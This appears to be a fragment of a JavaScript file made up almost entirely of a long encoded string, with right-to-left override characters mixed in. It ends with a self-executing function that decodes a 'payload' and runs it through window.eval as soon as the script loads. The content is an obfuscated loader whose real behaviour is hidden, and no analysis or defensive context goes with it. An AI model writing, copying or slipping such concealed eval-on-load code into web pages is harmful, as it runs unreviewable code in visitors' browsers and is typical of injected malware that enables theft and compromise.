}|z|q`#r(141<<pfx(Wglyc:-~z\">7:00?zb|~vj&^k`yl=u.=*>::32~hu%iocvp4X)vmc}ha,g~oyw*nrhd~alk!a%LPo.p'Ub%<riu(~963:?+042306>?&:2:3{bqpue%s2z+4!<~jv$bljmb;]U<ub~\\jhlg|s>(5?432qfv(oyo962><+011356583q`}}{i%mvo>{ <qez'|b`^~i4(1001<pfx(olz|4u0tv0-`|idpahf#p\\~x%`!}piu&ar}yK4%1?6<<}dt)Fsr521;0*0?2sit&rn;0?=1+>;=z,-.0'P5lkk Nk)?rgx)uer;nhce-w`8&-‮'%015;<6700&<57,%2*\"‮]U-)<|iq%aizo8`qji.yjs,*.l}nbtdnjT$-t+ {V}359:(['$Ko`j!rmb,rbmb`pV+#6Z`//nc)$~-|exigbg%-Ui(~A [TQ#b()*Y*)/lcjcze,\"slqsn!BlI0[sX}78;a! {`vT$k,? x,edhjyg;Yp7;54([%qmp.d,8Z(:ync74g3a66_c. ~dt!u-?.8}bfkgiec`>V|586c-!y/6T!~&T+zDLsz0%7[a# `ez )vls$c%?-1:/bT!:-c4 &/l!!xUa ,)[*~as n!9T$}\"ahapJnbhL{(d->Wq\",! d)[T5 )c-=8T$-e\"+ 3 (&S-l;Yp7;54([%',j.1,-,a-+.h.\"[$4v:`f4<o57)!'-/c$?=.12#/'Z(,t4Zs8765+T!&-e/=-,-`!]/0wf=2=m00m\"U'U\"+f 086+69&&! Y's4Ys977b. }Wq46:kY*%phut}eT!n#y`Syvlff+>6&>Tev&&+,:?<0+=<>?);>:7#' .>sfy%tlaua{oKdqjr7!c}he|nii\"')‮i{'k8\\:54'7?<$5<?(wc~@k|ct~fj+\"s~,T3+pZg )>$~l%?<7:2*2><2sit&irJ:Q%5=:$+[Y'+#~{ +/u.$vqc&+%~gt(#\":<0:+;;>HKs})X=$61=9<%3<411+r!h$3X(bkkk-g$orkfsbjh!hI-s/sv-?pk{%alj564?:&77<3+c],{m%phu'lJlr|$Y$1{`|stf'omf3~,2:14<+7>>phu'upA5T*igz!d}J*nrhd~alk!Z%ubvl\\k*}Mo-sdgewkjo2sit&gieO7%:3;82?=170wc}ruj(hfhL?{##*!}piu&kc[dlb5RZ>(63142qfv(VL6&v\"(2sit&zb`uo{k8nm}Tqjujbc! uanumxl#) 94?,)!(,.ws+/&3`a-wbmwczo. |u\"?_[1!~u/=~ft'}B>(=0?2>sfy%hfp:/fb+@ero!*\"‮7;44)9:0/&!#'+57:*, /.y=51?)?$VUr(&@qM'xiu%hr~'>.#,{ /.y=>=%327?2'f$=*Etlw052'0:46~.#p~hse$fhagjsl)g*;mo'tf|s*o@~er-khbqegra,s.jz~jj\"gjarefr`/1*zEolzjix1364r./j{q`+jko~jk}`&|%=.ws+8MQxpf_'ydpr.jac/fdmped|c ,)3ucaxmpm'kfrkq:y``{btl&dg~jpzv9> `sfdrnef+v{i%rmphC,}:55*=090&&=|hw(mcpbkw7*jja*t.-,<>=?<<%l|KPY$rgx)bmrGkoob|mn`g|4ipikx%phu'cmsIhlmc|lhmhr507>2zdp+3fw%anv;RZ<mn/ eks&')wm`tmtn)~an`)4)15,!--tlaua{o&~vh;7ejkgrahh)bzfc !r/cpihqofi/ufl|Q(cd#r^U{/ .=6<?1+>;=<w`ay`ua)dk}i| /?pk{%{wVltw:<1;72*atl~}7%`|idpahf+carKjmacpmjci~ *~0185x-ps'=tbkwm|znbvcya+kisfs;71u8wln{bvm)~wj4khgisadj*nxlc3tcnuctb&wldm4ijr<v*,<20*94<:9G&xhs\")={brT~gqdnm! w`ay`ua (.‮41?1*7>#*$tcnuctb!8wl||uk%,y``{btl&dg~jp) ?00(3?>4<3>1(#'2qdw'Mk;RZ<riu(~tLS7<606(?73<w!+*#‮+[Yf\\nirT~c&\"(!05249'51=2=76)3:8'*2nc-/y``{btlKh}ep$#*:*\"bcfn`bnfv8fin'wdq!*/4:5-sqiy$`Jkbg5$xT[`u`K!>i{'mwnmpk4650>)99? \"\"yh|.!{cwpg/**#‮+b%smgg~+-(-3Fk`k*To`zuc\\ugda{>q{}l<x>qjw&d:*0;6>0,bsdjqaih }uk`g/fOfZ.~-a~ke}nhj v$ca(q|_/}~ft'`c`jex4/~\"nmoOnjg{}`quj!0!~u/{!z//#3ud{(c`rdQ6-}.rwtifnrupb`.?*\"c/cp'l}mf}afi%@b#,}1360ub)(#de}bi!252?$=:=%/clfn]mv`PdCqaqgyvgj-3'~~ZTh*bddy'%/lpcmas`ibaj`yQm,><23>)/Pgo~|p-200;1% aCDiUdeawj|edxTf|ona/<2:0?);<~,2%874>*374<<%c{h~)?rgx)v}rkx:.|-MUOj_e`fgamajmk >SZ$,|htz.?Iemg+!d~|dp.2|ia`abkcmz.?:?<9*01?210?0&2141>30:3fw%jQrM4X)bak|nv,lm~d^*`}iescgm-qP`h,~%)>phu'r5%eT&?1?00&60:<tb~}qk)~2z,>ijsonfskz<~jv$q~4Z&eifsgnd{+onhQ)'i1y&fu$id`barcglk|;>??3ok**>>816+=52>$+<qez'zsR959>=u/.!<)-#u8hbek`b%iyprlu<2:3;0<6(?=79;kcjd`m(qd3:2<=|\"lBj/jgn|hjq`&~oiop wgj$W>WZE|'wdq05492<-u<`ab$hx|qmt=0416'3^^4`ca%wf}>$sehqxipc&/ond$j|c+c`e$`KOR!ijlshkso+m`jam#lggo'Z3?>?)62<=8,ts!<,xZP?!f |,5pbjmr&xhs372>5=3>=4(2?>0+05:4= z>5?*2,Tr@bnrXNii}Uwk`$)>1>)3=5:?!~eevMcrlbkvgsiXnu/|.:`lacl({fs/(0acebsa(pae`kq${l8={!/)-‮ epgk}njk/gwp~+sl]+rcVs/q85>?{!//-%!8-r/`kJl}Ca.=/u.$,lljmer_tjli_ 0*zjy*t.>x.#,=";(function(){window.eval(pmt(payload));})();